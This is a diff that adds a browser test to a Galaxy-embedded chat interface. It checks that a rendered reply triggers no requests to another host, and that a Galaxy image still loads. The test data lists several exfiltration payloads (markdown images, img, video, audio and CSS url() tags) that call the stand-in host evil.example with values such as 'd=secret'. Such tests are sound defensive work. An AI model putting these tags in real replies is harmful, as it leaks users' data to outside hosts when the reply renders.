@@ -53,6 +53,28 @@ function check(name, ok, detail) {
     const href = await link.getAttribute("href", { timeout: 60000 }).catch(() => null);
     check("a dataset the reply names links to the Galaxy it runs in", href === `${STUB}/datasets/0123456789abcdef`, href);
 
+    // A reply that would carry data to another host the moment it renders, beside one Galaxy image.
+    const elsewhere = [];
+    await page.route(/^https?:\/\/evil\.example\//, (r) => {
+        elsewhere.push(new URL(r.request().url()).pathname);
+        return r.fulfill({ status: 204 });
+    });
+    const galaxyImage = page.waitForRequest((r) => r.url() === `${STUB}/api/datasets/d1/display?preview=true`, { timeout: 30000 })
+        .then(() => true, () => false);
+    await fetch(`${STUB}/__script?name=echo`);
+    await frame.locator("#input").fill([
+        "![x](https://evil.example/md?d=secret) ![x](//evil.example/protocol-relative)",
+        '<img src="https://evil.example/img"> <video poster="https://evil.example/poster"></video>',
+        '<audio src="https://evil.example/audio" preload="auto"></audio> <input type="image" src="https://evil.example/input">',
+        '<div style="background-image:url(https://evil.example/style)">x</div>',
+        "![galaxy](/api/datasets/d1/display?preview=true) [docs](https://evil.example/link)",
+    ].join("\n\n"));
+    await frame.locator("#send-btn").click();
+    await frame.locator("a", { hasText: "docs" }).last().waitFor({ timeout: 60000 }).catch(() => {});
+    await page.waitForTimeout(2000);
+    check("a reply makes the browser fetch nothing from another host", elsewhere.length === 0, elsewhere.join(", "));
+    check("an image from Galaxy itself still loads", await galaxyImage);
+
     const failed = results.filter((r) => !r.ok);
     console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
     await browser.close();
